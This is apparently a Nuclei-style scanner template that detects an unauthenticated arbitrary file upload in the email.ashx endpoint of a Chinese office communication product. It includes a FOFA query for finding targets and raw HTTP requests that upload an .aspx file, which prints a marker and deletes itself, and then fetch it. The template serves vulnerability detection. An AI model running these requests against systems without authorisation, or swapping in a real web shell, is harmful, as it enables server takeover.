id: AFBGTXZJ-email-File-upload

info:
  name: 傲发办公通信专家 email.ashx 任意文件上传
  author: HuanXiong
  severity: critical
  description: |-
    fofa: body="getincommingcall"
    傲发办公通信专家 email.ashx 接口处存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
  reference:
    - 
  tags: File upload

variables:
  username: "{{to_lower(rand_base(6))}}" 
  
http:
  - raw:
      - |
        POST /handle/email.ashx?action=updatefiles&logname=stc HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data;boundary =---------------------------142851345723692939351758052805

        -----------------------------142851345723692939351758052805
        Content-Disposition: form-data; name="Filedata"; filename="{{username}}.aspx"
        Content-Type: text/plain

        <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
        -----------------------------142851345723692939351758052805--
      
      - |
        GET /upFiles/email/temp/stc/{{username}}.aspx HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        name: 任意文件上传
        dsl:
          - "status_code == 200 && contains (body,'pboyjnnrfipmplsukdeczudsefxmywe')"

